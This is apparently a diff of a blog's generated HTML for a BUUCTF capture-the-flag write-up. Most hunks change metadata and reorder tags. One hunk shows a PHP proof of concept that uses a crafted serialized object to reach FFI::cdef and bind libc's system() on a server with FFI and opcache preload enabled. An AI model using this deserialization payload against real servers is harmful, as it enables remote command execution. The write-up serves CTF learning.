@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/12/peqRTvICtjDFk4b.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/12/efMVNopTd5yjtcK.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/12/ERmO9S4sX6rQFMa.png">
-<meta property="og:updated_time" content="2019-11-14T13:56:27.732Z">
+<meta property="og:updated_time" content="2019-11-21T03:50:14.037Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="buuctf-wp-6">
 <meta name="twitter:image" content="https://i.loli.net/2019/11/11/CJDEuQZBiYcS6e1.png">
@@ -273,7 +273,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffi.enable = preload </span><br><span class="line">opcache.preload = preload.php</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>在preload机制中，preload.php中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用，所以在注入代码的时候，并不需要include(‘preload.php’)文件 </p>
+<p>在preload机制中，<code>preload.php</code>中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用，所以在注入代码的时候，并不需要<code>include(&#39;preload.php&#39;)</code>文件 </p>
 </blockquote>
 <p>构造（参考wp）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &apos;ret&apos; =&gt; null,</span><br><span class="line">        &apos;func&apos; =&gt; &apos;FFI::cdef&apos;,</span><br><span class="line">        &apos;arg&apos; =&gt; &apos;int system(char *command);&apos;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        echo &quot;run&lt;br&gt;&quot;;</span><br><span class="line">        $this-&gt;data[&apos;ret&apos;] = $this-&gt;data[&apos;func&apos;]($this-&gt;data[&apos;arg&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&apos;No implemented&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        echo &quot;__construct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo base64_encode(serialize($a)); // 即payload</span><br></pre></td></tr></table></figure>
@@ -595,14 +595,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">thinkcmf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
@@ -611,11 +603,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tp3</a>
+                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">typecho</a>
+                <a href="javascript:void(0)" class="js-tag color4">thinkcmf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">tp3</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -627,7 +623,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">chinaz</a>
+                <a href="javascript:void(0)" class="js-tag color3">typecho</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -635,11 +631,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">docker</a>
+                <a href="javascript:void(0)" class="js-tag color2">chinaz</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞挖掘</a>
+                <a href="javascript:void(0)" class="js-tag color2">docker</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -647,7 +643,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞挖掘</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -655,15 +651,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zzzphp</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+                <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
               </li>
              
               <li class="article-tag-list-item">
